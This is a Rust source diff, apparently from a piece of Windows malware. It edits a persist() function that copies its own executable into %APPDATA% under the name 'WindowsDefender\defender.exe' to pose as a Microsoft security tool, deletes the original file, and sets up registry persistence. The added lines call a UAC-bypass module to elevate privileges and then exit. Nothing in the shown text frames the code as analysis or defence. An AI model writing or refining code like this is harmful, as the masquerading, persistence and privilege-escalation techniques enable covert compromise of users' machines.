@@ -3,15 +3,17 @@ use winreg::RegKey;
 use std::path::{Path, PathBuf};
 use std::env;
 use std::fs;
-
+use std::process;
+use crate::uac_bypass;
 /// Target subpath inside APPDATA
 const TARGET_SUBPATH: &str = "WindowsDefender\\defender.exe";
 
 pub fn persist() -> std::io::Result<()> {
     // Resolve %APPDATA%
-    let appdata = env::var("APPDATA")?;
-    let target_path: PathBuf = Path::new(&appdata).join(TARGET_SUBPATH);
+    let appdata = env::var("APPDATA")
+        .map_err(|e| std::io::Error::new(std::io::ErrorKind::NotFound, e))?;
 
+    let target_path: PathBuf = Path::new(&appdata).join(TARGET_SUBPATH);    
     // Ensure directory exists
     if let Some(dir) = target_path.parent() {
         fs::create_dir_all(dir)?;
@@ -23,7 +25,9 @@ pub fn persist() -> std::io::Result<()> {
     // Copy itself if not already there
     if current_exe != target_path {
         fs::copy(&current_exe, &target_path)?;
-        fs::delete(&current_exe)?;
+        fs::remove_file(&current_exe)?;
+        uac_bypass::elevate_uac(&target_path.to_string_lossy().to_string());
+        std::process::exit(0);
     }
 
     // Registry persistence
